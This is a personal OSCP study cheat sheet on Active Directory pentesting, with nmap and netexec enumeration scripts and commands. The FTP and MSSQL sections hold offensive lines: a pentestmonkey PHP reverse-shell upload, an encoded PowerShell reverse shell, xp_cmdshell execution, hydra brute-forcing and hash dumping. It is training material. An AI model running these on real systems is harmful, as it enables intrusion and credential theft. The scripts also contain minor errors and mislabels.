# 🏅 OSCP Cheat Sheet

{% hint style="success" %}
Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
{% endhint %}

***

## **🛡️ Active Directory Cheat Sheet**

### 🔎**Recon Scans**

<details>

<summary>Port scanning and version scraping</summary>

```python
#!/usr/bin/env python3
import argparse
import subprocess
import os
import time
from datetime import datetime

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution: {e}")
        return None

def create_output_dir(base_dir="oscp_scans"):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"{base_dir}_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def quick_scan(target, output_dir, scan_type="tcp"):
    print(f"\n[⚡] Début du scan {scan_type.upper()} rapide...")
    output_file = f"{output_dir}/initial_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sS -T4 --max-retries 1 --min-rate 1000 -p- {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -T4 --max-retries 1 --min-rate 500 -p- {target} -oN {output_file}"
    
    run_command(command)
    return parse_open_ports(output_file)

def parse_open_ports(nmap_file):
    ports = []
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line and 'open' in line:
                ports.append(line.split('/')[0])
            elif '/udp' in line and 'open' in line:
                ports.append(line.split('/')[0])
    return ','.join(ports)

def deep_scan(target, ports, output_dir, scan_type="tcp"):
    if not ports:
        return
    
    print(f"\n[🔍] Scan approfondi {scan_type.upper()} sur les ports: {ports}")
    output_file = f"{output_dir}/deep_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sCV -T4 -p{ports} {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -sCV -T4 -p{ports} {target} -oN {output_file}"
    
    run_command(command)
    return output_file

def parse_versions(nmap_file, output_dir):
    print(f"\n[📄] Extraction des versions logicielles...")
    versions = []
    
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 4:
                    port_proto = parts[0]
                    service = parts[2]
                    version = ' '.join(parts[4:])
                    versions.append(f"{port_proto} - {service} {version}")
    
    version_file = f"{output_dir}/versions.txt"
    with open(version_file, 'w') as f:
        f.write("=== Versions logicielles détectées ===\n\n")
        f.write('\n'.join(versions))
    
    print(f"[✅] Versions sauvegardées dans: {version_file}")

def main():
    parser = argparse.ArgumentParser(description="OSCP Recon Scanner")
    parser.add_argument("target", help="Cible à scanner")
    parser.add_argument("-o", "--output", help="Répertoire de sortie")
    parser.add_argument("--udp", action="store_true", help="Activer le scan UDP")
    args = parser.parse_args()

    output_dir = args.output or create_output_dir()
    open_ports = {'tcp': '', 'udp': ''}

    # Scan TCP
    open_ports['tcp'] = quick_scan(args.target, output_dir, "tcp")
    deep_scan_file = deep_scan(args.target, open_ports['tcp'], output_dir, "tcp")
    
    # Scan UDP si activé
    if args.udp:
        open_ports['udp'] = quick_scan(args.target, output_dir, "udp")
        deep_scan_file = deep_scan(args.target, open_ports['udp'], output_dir, "udp")

    # Extraction des versions
    if deep_scan_file:
        parse_versions(deep_scan_file, output_dir)
    
    print(f"\n[🎉] Scan terminé! Résultats dans: {output_dir}")

if __name__ == "__main__":
    main()
```

</details>

<details>

<summary>AD scanning</summary>

```bash
#!/bin/bash

# Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
OUTPUT_DIR="AD_Recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{bloodhound,shares,users,services}

# Vérification des dépendances
check_deps() {
    command -v bloodhound-python >/dev/null 2>&1 || echo -e "${RED}[-] bloodhound-python non installé!${NC}"
    command -v jq >/dev/null 2>&1 || echo -e "${RED}[-] jq non installé!${NC}"
}

# Fonction d'énumération SMB avancée
smb_enum() {
    echo -e "\n${CYAN}[=== SMB Enumération ===]${NC}"
    
    # Scan complet SMB
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --shares --sessions --disks --loggedon-users --users --groups --rid-brute --pass-pol --ntds --kerberos --gpo | tee $OUTPUT_DIR/smb_full.txt
    
    # Extraction des shares accessibles
    grep "READ" $OUTPUT_DIR/smb_full.txt | awk '{print $2}' | sort -u > $OUTPUT_DIR/shares/available_shares.txt
    
    # Téléchargement des shares
    while read share; do
        echo -e "${YELLOW}[*] Téléchargement du share: $share${NC}"
        smbclient -U "$DOMAIN/$USER%$PASSWORD" "//$IP/$share" -c "recurse; prompt; mget *" -Tc $OUTPUT_DIR/shares/${share}_download >/dev/null 2>&1
    done < $OUTPUT_DIR/shares/available_shares.txt
    
    # Vérification des droits d'écriture
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --spider-share '.*' --check-write | tee $OUTPUT_DIR/shares/writable_shares.txt
}

# Enumération LDAP complète
ldap_enum() {
    echo -e "\n${CYAN}[=== LDAP Enumération ===]${NC}"
    
    # Extraction users avec descriptions
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --verbose | tee $OUTPUT_DIR/ldap_full.txt
    grep -i "description:" $OUTPUT_DIR/ldap_full.txt | awk -F '│' '{print $3,$5}' | column -t > $OUTPUT_DIR/users/user_descriptions.txt
    
    # Extraction propre des usernames
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --json | jq -r '.hosts[].users[] | .username' | sort -u > $OUTPUT_DIR/users/all_users.txt
    
    # Trusts et Password Policy
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --trusts --password-policy | tee $OUTPUT_DIR/ldap_trusts_pol.txt
}

# Enumération MSSQL
mssql_enum() {
    echo -e "\n${CYAN}[=== MSSQL Enumération ===]${NC}"
    
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --query "SELECT name FROM sys.databases" | tee $OUTPUT_DIR/services/mssql_databases.txt
    
    # Test xp_cmdshell
    echo -e "${YELLOW}[*] Test xp_cmdshell${NC}"
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --enable-xp-cmdshell
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --xp-cmd "whoami /all" | tee $OUTPUT_DIR/services/mssql_xp_cmdshell.txt
}

# Enumération RDP
rdp_enum() {
    echo -e "\n${CYAN}[=== RDP Checks ===]${NC}"
    netexec winrm $IP -u $USER -p $PASSWORD -d $DOMAIN --local-groups --users | tee $OUTPUT_DIR/services/rdp_access.txt
}

# BloodHound Ingestor
bloodhound_enum() {
    echo -e "\n${CYAN}[=== BloodHound Collection ===]${NC}"
    
    if command -v bloodhound-python &> /dev/null; then
        bloodhound-python -c All -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc "$IP" --zip --dns-tcp --disable-pooling -o "$OUTPUT_DIR/bloodhound"
        echo -e "${GREEN}[+] Fichiers BloodHound générés dans: $OUTPUT_DIR/bloodhound${NC}"
    else
        echo -e "${RED}[-] bloodhound-python non installé!${NC}"
    fi
}

# Low Hanging Fruits Checks
low_hanging_fruits() {
    echo -e "\n${CYAN}[=== Low Hanging Fruits ===]${NC}"
    
    # Password Policy
    grep "Password Policy" $OUTPUT_DIR/ldap_trusts_pol.txt | tee $OUTPUT_DIR/lhf/password_policy.txt
    
    # AS-REP Roastable Users
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --asreproast | tee $OUTPUT_DIR/lhf/asrep_roast.txt
    
    # Admin Access Check
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --admin-check | tee $OUTPUT_DIR/lhf/admin_access.txt
    
    # MSSQL Admin Check
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --is-admin | tee $OUTPUT_DIR/lhf/mssql_admin.txt
    
    # Unconstrained Delegation
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --unconstrained | tee $OUTPUT_DIR/lhf/unconstrained_deleg.txt
    
    # GPO vulnérables
    grep -i "vulnerable" $OUTPUT_DIR/smb_full.txt | tee $OUTPUT_DIR/lhf/vuln_gpo.txt
}

# Main
if [ $# -ne 4 ]; then
    echo -e "${RED}Usage: $0 <IP> <USER> <PASSWORD> <DOMAIN>${NC}"
    exit 1
fi

IP=$1
USER=$2
PASSWORD=$3
DOMAIN=$4

check_deps
smb_enum
ldap_enum
mssql_enum
rdp_enum
bloodhound_enum
low_hanging_fruits

# Mise à jour DNS
echo -e "\n${CYAN}[=== DNS Update ===]${NC}"
grep -iE "(Domain|Forest):" $OUTPUT_DIR/ldap_*.txt | awk '{print $NF}' | sort -u | while read domain; do
    echo "$IP $domain" | sudo tee -a /etc/hosts
    echo "$IP $(echo $domain | cut -d'.' -f1)" | sudo tee -a /etc/hosts
    
    # Zone Transfer Test
    dig @$IP $domain axfr | tee $OUTPUT_DIR/dns_zone_transfer.txt
done

# Rapport Final
echo -e "\n${GREEN}[+] Recon complete!${NC}"
echo -e "${CYAN}[*] Points d'intérêt:${NC}"
grep -iHn "vulnerable\|writable\|admin\|asrep\|delegation" $OUTPUT_DIR/*/*.txt
echo -e "\n${GREEN}[+] Les credentials BloodHound: $USER:$PASSWORD${NC}"
```

</details>

<details>

<summary>Common services (SNMP, HTTP, SMB, FTP, SSH, RDP, MYSQL, MSSQL, DNS, SMTP, POP3, IMAP)</summary>

```bash
#!/bin/bash

# Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
OUTPUT_DIR="Service_Scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Dictionnaire de services avec commandes associées
declare -A SERVICE_SCANS=(
    ["SNMP"]="snmp_scan"
    ["HTTP"]="http_scan"
    ["SMB"]="smb_scan"
    ["FTP"]="ftp_scan"
    ["SSH"]="ssh_scan"
    ["RDP"]="rdp_scan"
    ["MYSQL"]="mysql_scan"
    ["MSSQL"]="mssql_scan"
    ["DNS"]="dns_scan"
    ["SMTP"]="smtp_scan"
    ["POP3"]="pop3_scan"
    ["IMAP"]="imap_scan"
)

# Fonctions d'énumération par service
snmp_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SNMP] Running scan on $ip${NC}"
    
    # Scan de communauté SNMP
    echo "=== SNMP COMMUNITIES ===" > $OUTPUT_DIR/SNMP.txt
    snmpwalk -v2c -c public $ip 2>/dev/null | tee -a $OUTPUT_DIR/SNMP.txt
    snmp-check -c public -v2c $ip >> $OUTPUT_DIR/SNMP.txt 2>&1
    
    # Recherche de mots-clés
    grep -E -i "version|community|string|vulnerable|Cisco|config" $OUTPUT_DIR/SNMP.txt | sort -u > $OUTPUT_DIR/SNMP_KEYWORDS.txt
}

http_scan() {
    local ip=$1
    echo -e "\n${CYAN}[HTTP] Running scan on $ip${NC}"
    
    # Scan de base
    nikto -h $ip -output $OUTPUT_DIR/HTTP_NIKTO.txt
    whatweb $ip --color=never > $OUTPUT_DIR/HTTP_WHATWEB.txt
    
    # Détection de CMS
    wget -qO- $ip | grep -E -i "wp-content|drupal|joomla|wordpress" >> $OUTPUT_DIR/HTTP_CMS.txt
}

smb_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SMB] Running scan on $ip${NC}"
    
    netexec smb $ip --shares --users --groups --pass-pol > $OUTPUT_DIR/SMB_NETEXEC.txt
    enum4linux -a $ip >> $OUTPUT_DIR/SMB_ENUM4LINUX.txt 2>&1
    
    grep -E -i "READ|WRITE|VERSION|ADMIN|PASSWORD" $OUTPUT_DIR/SMB_*.txt > $OUTPUT_DIR/SMB_KEYWORDS.txt
}

# ... (autres scan à ajouter plus tard)

main() {
    echo -e "${GREEN}=== Service Enumeration Tool ===${NC}"
    read -p "Target IP/Host: " TARGET
    echo -e "${YELLOW}Available services: ${!SERVICE_SCANS[@]}${NC}"
    read -p "Enter services (comma-separated): " SERVICES
    
    IFS=',' read -ra SERVICE_LIST <<< "$SERVICES"
    
    for service in "${SERVICE_LIST[@]}"; do
        service=$(echo $service | xargs) # Nettoyage
        if [[ -n "${SERVICE_SCANS[$service]}" ]]; then
            ${SERVICE_SCANS[$service]} $TARGET
        else
            echo -e "${RED}[!] Service non supporté: $service${NC}"
        fi
    done
    
    generate_report
}

generate_report() {
    echo -e "\n${GREEN}=== Scan Report ===${NC}"
    echo -e "Target: $TARGET"
    echo -e "Services scannés: ${SERVICE_LIST[@]}"
    
    # Résumé des findings
    grep -EH -i "vulnerable|admin|password|version|CVE-" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/CRITICAL_FINDINGS.txt
    grep -H -i "user" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/USER_FINDINGS.txt
    
    echo -e "\n${CYAN}[!] Points critiques (Vérifier CRITICAL_FINDINGS.txt):${NC}"
    cat $OUTPUT_DIR/CRITICAL_FINDINGS.txt | awk '!seen[$0]++'
    
    echo -e "\n${GREEN}[+] Scan complet. Résultats dans: $OUTPUT_DIR${NC}"
}

# Démarrage
main
```

</details>

## 📌 Reconnaissance & Énumération

First scan to do:

```sh
enum4linux <IP>
```

### 🔍 RPC Enumeration

#### **Manual Commands**

```sh
#anonymous login
rpcclient -N -U '' <IP> -c "enumdomusers" | grep -oP '(?<=user:\[)[^\]]+' > users.txt
```

### 🔍 FTP Enumeration

#### **Manual Commands and exploitation**

<pre class="language-sh"><code class="lang-sh">#enumeration
nxc ftp &#x3C;IP> -u '' -p '' --ls
#try admin:admin credentials!!!

netexec ftp &#x3C;IP> -u '' -p '' --ls [DIRECTORY]

#Get Files
netexec ftp &#x3C;IP> -u ''-p '' --get ftp_flag.thm

#Reverse Shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
<strong>
</strong><strong>#modify IP and port and connect to FTP session
</strong>ftp &#x3C;target-ip>

# Upload the payload you downloaded and check listener
ftp> put shell.php

--------
#bruteforce
sudo hydra -L users.txt -P '/wordlist' -s 21 ftp://$IP
</code></pre>

### 🔍 SMB Enumeration

#### **Manual Commands (netexec)**

<pre class="language-bash"><code class="lang-bash"># Enumerate SMB shares, users, sessions, and more (including anonymous auth)
netexec smb 192.168.56.175 -u '' -p '' --shares --users --rid-brute

# List accessible shares
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --shares | tee shares.txt

# Check for writable shares
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --spider-share '.*' --check-write | tee writable_shares.txt

#grep out usernames from --users output:
| grep -E "SMB\s+.*\s+[A-Za-z]+\.[A-Za-z]+" | awk '{print $5} > users.txt

#grep sam hive hashes
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam

#grep out hashes and usernames (check if you have others, not the best grep)
<strong>grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $1}' > secretsdumpusernames.txt
</strong>grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $4}' > secretsdumphashes.txt

</code></pre>

### 🔍 LDAP Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate LDAP users, groups, and policies (including anonymous if allowed)
netexec ldap 10.10.10.5 -u '' -p '' --users --groups --password-policy | tee ldap_enum_anon.txt
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --groups --password-policy | tee ldap_enum.txt

# Extract all users
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --json | jq -r '.hosts[].users[] | .username' | sort -u | tee users.txt

# Enumerate domain trusts
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --trusts | tee domain_trusts.txt
```

### 🔍 MSSQL Enumeration

#### **Manual Commands (netexec)**

```bash
# Check MSSQL login (including null session)
netexec mssql 10.10.10.5 -u '' -p ''
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123'

# List databases
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --query "SELECT name FROM sys.databases" | tee mssql_databases.txt

# Enable xp_cmdshell
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --enable-xp-cmdshell

# Execute command via xp_cmdshell
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --xp-cmd "whoami /all" | tee xp_cmdshell_output.txt

#check privesc:
netExec mssql <ip> -u user -p password -M mssql_priv

#check impersonate:
netExec mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc

#reverse shell on active directory:
nxc mssql <ip> -u '' -p '' -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOAA2AC4AMQA0ADcAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

### 🔍 RDP & WinRM Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate RDP access
netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --local-groups --users | tee rdp_users.txt

# Check if WinRM is enabled
netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --exec whoami
```

### 🔍 SNMP Enumeration

#### **Manual Commands**

```bash
# Enumerate SNMP with public community string
snmpwalk -v2c -c public 10.10.10.5

# Check running processes
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2

# Enumerate open TCP ports
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.6.13.1.3
```

### 🔍 BloodHound Collection

#### **Manual Commands (BloodHound)**

```bash
# Collect BloodHound data
bloodhound-python -c All -u 'bob' -p 'Password123' -d 'contoso.local' -dc 10.10.10.5 --zip --dns-tcp --disable-pooling -o bloodhound/
```

### 🔍 Low Hanging Fruits Checks

#### **Manual Commands (netexec)**

```bash
# Check password policy
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --password-policy | tee password_policy.txt

# Identify AS-REP roastable users
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --asreproast | tee asrep_roast.txt
# Crack hashes with hashcat: hashcat -m 18200 asrep_roast.txt rockyou.txt

# Check for unconstrained delegation
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --unconstrained | tee unconstrained_deleg.txt

# Check if the user is an admin
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --admin-check | tee admin_access.txt
```

### 🔍 Kerberos Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate Kerberos tickets (TGT/TGS)
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberos | tee kerberos_tickets.txt

# Enumerate users that don’t require pre-authentication (Kerberoasting)
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberoast | tee kerberoast.txt
# Crack hashes with hashcat: hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 🔍 DNS Enumeration

#### **Manual Commands**

```bash
# Test DNS zone transfer
nslookup -type=AXFR contoso.local 10.10.10.5 | tee dns_zone_transfer.txt

# Resolve domain name
nslookup contoso.local 10.10.10.5
```
